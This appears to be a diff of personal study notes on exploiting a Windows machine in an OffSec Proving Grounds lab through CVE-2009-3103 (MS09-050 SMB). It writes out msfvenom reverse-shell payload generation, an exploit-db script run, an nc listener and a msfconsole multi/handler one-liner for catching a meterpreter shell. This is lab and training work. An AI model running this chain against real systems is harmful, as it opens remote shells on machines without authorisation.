@@ -1,8 +1,9 @@
 # Internal - Windows - OffSec - Proven Grounds
-Started: July 16, 2026 ~ 1 hr. 
+Completed: July 20, 2026 ~ 2 hr. 
 
 - References:
-
+- https://www.youtube.com/watch?v=bGU4cpdtItI
+- https://medium.com/@ryanchamruiyang/proving-grounds-internal-walkthrough-by-ryan-cham-6db719991796
 
 ## Workflow
 ### Inital Recon
@@ -54,11 +55,11 @@ Host script results:
 |_smb-vuln-ms10-054: false
 ```
 
-### X - CVE-2009-3103
+### Correct - CVE-2009-3103
 I see SP1 and mention of `CVE-2009-3103` but this is a DoS attack? Let's see what exploits are available and what they do. 
 
 So initially I see exploitdb does have some options but does request `smb.SMBConnection`. 
-There is an updated script that does not rely on that module.
+There is an updated script that does not rely on that module?
 https://github.com/Sic4rio/CVE-2009-3103---srv2.sys-SMB-Code-Execution-Python-MS09-050-/tree/main
 ```
 git clone https://github.com/Sic4rio/CVE-2009-3103---srv2.sys-SMB-Code-Execution-Python-MS09-050-/tree/main
@@ -70,10 +71,14 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 EXITFUNC=thread
 
 chmod u+x edit-MS09-050.py
 
-# Ran the exploit, need to have Administator password for this to work
-```
+# Ran the exploit, need to have Administator password for this to work?
 
-**I need to better understand each protocol and how different combinations of each can lead to potential compromise. **
+nc -nlvp 443 
+```
+#### Summary
+So I was on the right track. I need to pay attention to the code. This was one of those cases where likely the only path was to utilize metasploit due to `windows/meterpreter/reverse_tcp`. 
+
+The other thing is that `searchsploit` does have a payload that does work that is almost if not the same as what I pulled from GitHub. 
 
 ---
 
@@ -147,5 +152,12 @@ When we get machine information from rdp it is worth adding the target to the `e
 ```
 sudo mousepad /etc/hosts
 
+Might get error about ModuleNotFoundError: No module named 'smb' 
+Turns out, it looks like in the code there isn't even a need for 
+# On one terminal 
+python3 40280.py <target-IP>
 
+
+# On other terminal (listener)
+msfconsole -q -x 'use multi/handler ; set LHOST tun0 ; set LPORT 443 ; set payload windows/meterpreter/reverse_tcp ; run' 
 ```
